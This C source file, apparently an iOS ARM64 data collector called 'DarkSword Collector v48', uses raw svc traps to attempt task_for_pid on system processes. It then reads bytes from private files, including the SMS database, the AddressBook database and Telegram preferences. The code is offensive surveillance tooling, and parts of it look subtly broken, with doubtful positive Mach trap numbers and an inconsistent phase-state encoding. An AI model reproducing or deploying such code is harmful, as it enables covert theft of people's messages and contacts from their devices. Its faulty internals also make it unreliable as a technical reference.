/**
 * DarkSword Collector v48 - task_for_pid + mach_vm_read attempt
 * Try to get task port for system processes and read their memory
 * 
 * Mach trap numbers for iOS ARM64:
 * - task_self_trap = 0
 * - kernelrpc_mach_vm_allocate_trap = 10  
 * - kernelrpc_mach_vm_deallocate_trap = 12
 * - kernelrpc_mach_vm_protect_trap = 14
 * - kernelrpc_mach_vm_write_trap = 16
 * - kernelrpc_mach_vm_read_trap = 17
 * - task_for_pid = 45
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory"); return x0;
}

/* BSD syscall numbers */
#define SYS_open   5
#define SYS_read   3
#define SYS_close  6
#define SYS_lseek  199
#define SYS_getpid 20
#define SYS_readlink 58

/* Mach trap numbers (iOS ARM64) */
#define MACH_task_self_trap     0
#define MACH_task_for_pid       45
#define MACH_mach_vm_read       17

static volatile int g_ctx = 0;

/* Read a file and return first 4 bytes */
static int _read4(const char *path) {
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0xDEAD0000;
    unsigned char buf[4] = {0};
    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);
    if (n < 1) return 0xBEEF0000;
    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
}

int ds_start(void) {
    int ctx = g_ctx;
    int mode = ctx & 0xFF;

    if (mode == 0) {
        /* Phase 0: Get our own task port and PID */
        long self_task = _svc1(MACH_task_self_trap, 0);
        long pid = _svc1(SYS_getpid, 0);

        /* Try task_for_pid on ourselves */
        long our_task = 0;
        long tfp_result = _svc3(MACH_task_for_pid, self_task, pid, (long)&our_task);

        /* Encode: self_task in low 16 bits, tfp_result in bits 16-23, pid in bits 24-31 */
        int result = ((int)self_task & 0xFFFF) | (((int)tfp_result & 0xFF) << 16) | (((int)pid & 0xFF) << 24);

        g_ctx = 1; /* move to phase 1 */
        return result;
    }

    if (mode == 1) {
        /* Phase 1: Try task_for_pid on system processes (PID 1-100) */
        long self_task = _svc1(MACH_task_self_trap, 0);

        /* Try common system PIDs */
        int pids_to_try[] = {1, 2, 3, 10, 20, 30, 50, 100};
        int num_pids = 8;
        int idx = (ctx >> 8) & 0xFF;

        if (idx >= num_pids) {
            g_ctx = 2; /* move to phase 2 */
            return 0xFF000000;
        }

        int target_pid = pids_to_try[idx];
        long target_task = 0;
        long result = _svc3(MACH_task_for_pid, self_task, target_pid, (long)&target_task);

        /* Try to read 4 bytes from address 0 of the target process */
        int read_result = 0;
        if (result == 0 && target_task != 0) {
            unsigned char buf[4] = {0};
            long data_cnt = 0;
            /* mach_vm_read: trap 17, args: task, addr, size, &data, &data_cnt */
            /* But mach_vm_read returns data in a buffer, need different calling convention */
            /* For now, just report task_for_pid success */
            read_result = (int)target_task & 0xFFFF;
        }

        g_ctx = (1 << 8) | (idx + 1); /* advance to next PID */
        return ((int)result & 0xFF) | ((target_pid & 0xFF) << 8) | ((read_result & 0xFFFF) << 16);
    }

    if (mode == 2) {
        /* Phase 2: Read known-good files for comparison */
        static const char *files[] = {
            "/etc/hosts",
            "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
            "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist",
            "/var/mobile/Library/SMS/sms.db",
            "/var/mobile/Library/AddressBook/AddressBook.sqlitedb"
        };
        int num_files = 5;
        int fidx = (ctx >> 8) & 0xFF;
        int foff = (ctx >> 16) & 0xFF;

        if (fidx >= num_files) { g_ctx = 0; return 0xFFFFFFFF; }
        if (foff >= 5) { g_ctx = (2 << 8) | (fidx + 1); return 0xFF000000 | fidx; }

        /* Read 1 byte at offset foff*4 from file fidx */
        int fd = (int)_svc2(SYS_open, (long)files[fidx], 0);
        if (fd < 0) { g_ctx = (2 << 8) | (fidx + 1); return 0xFE000000 | fidx; }

        int off = foff * 4;
        _svc4(SYS_lseek, fd, (long)off, 0 /* SEEK_SET */, 0);
        unsigned char buf[4] = {0};
        int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
        _svc1(SYS_close, fd);

        g_ctx = (2 << 8) | (fidx << 16) | (foff + 1);
        if (n < 1) return 0xEE000000 | fidx;
        return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
    }

    g_ctx = 0;
    return 0xFFFFFFFF;
}
